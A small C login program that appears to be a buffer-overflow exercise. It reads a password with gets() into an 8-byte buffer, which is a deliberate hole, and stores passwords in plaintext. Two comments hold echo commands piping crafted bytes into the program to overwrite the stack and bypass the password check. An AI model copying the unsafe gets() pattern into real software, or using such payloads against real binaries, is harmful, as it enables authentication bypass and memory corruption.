#include "stdio.h"
#include "string.h"
#include "stdbool.h"
#define MAXLEN 8
#define MAXUSERS 2

typedef struct {
    char username[MAXLEN];
    char password[MAXLEN];
} User;


User users[MAXUSERS];
int userCount = 0;


// char* password1="amit";
// char* password2="nir";

void registerUser(void);
void showPasswords(void);
bool readFile(const char *filename);
int login(void);



// echo -n -e "\x01\x02\x03\x04\x05\x06\x07\x08\x00\xf1\xdf\x6f\x00\x00\x00\x00\x20\xf0\xdf\x6f\x01\x00\x00\x00\xb0\x3a\x00\x00\x01\x00\x00\x00" | ./app

int main(){
    if (!readFile("passwords.txt")) {
        printf("Failed to read from file\n");
        return 1;
    }
    // registerUser();
    if(login()!=0){
        printf("Succesed!!\n");
    }
    else{
        printf("Failed!!\n");
    }

    return 0;
}

void registerUser() {
    char username[MAXLEN];
    char password[MAXLEN];
    
    printf("Enter username: ");
    fgets(username, MAXLEN, stdin);
    username[strcspn(username, "\n")] = '\0';  // Remove the newline character
    
    printf("Enter password: ");
    fgets(password, MAXLEN, stdin);
    password[strcspn(password, "\n")] = '\0';  // Remove the newline character

    FILE *file = fopen("passwords.txt", "a");
    if (file == NULL) {
        perror("Failed to open file");
        return;
    }

    fprintf(file, "%s %s\n", username, password);
    fclose(file);

    printf("User registered successfully!\n");
}

void showPasswords(){
    for (int i = 0; i < userCount; i++) {
        printf("Username %d: %s\nPassword %d: %s\n", i + 1, users[i].username, i + 1, users[i].password);
    }
}

bool readFile(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (file == NULL) {
        perror("Failed to open file");
        return false;
    }

    while (fscanf(file, "%s %s", users[userCount].username, users[userCount].password) == 2) {
        userCount++;
        if (userCount >= MAXUSERS) {
            break;
        }
    }

    fclose(file);
    return true;
}


int login(void){
    int suc = 0;
    char buf[MAXLEN]={1,2,3,4,5,6,7,8};
    printf("Please enter your password: \n");
    gets(buf);
    if(strcmp(users[0].password,buf)==0){
        suc=true;
    }
// echo -n -e "\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf1\xdf\x6f\x00\x00\x00\x00\x20\xf0\xdf\x6f\x01\x00\x00\x00\xbc\x3a\x00\x00\x01\x00\x00\x00" | ./app
    return suc;
}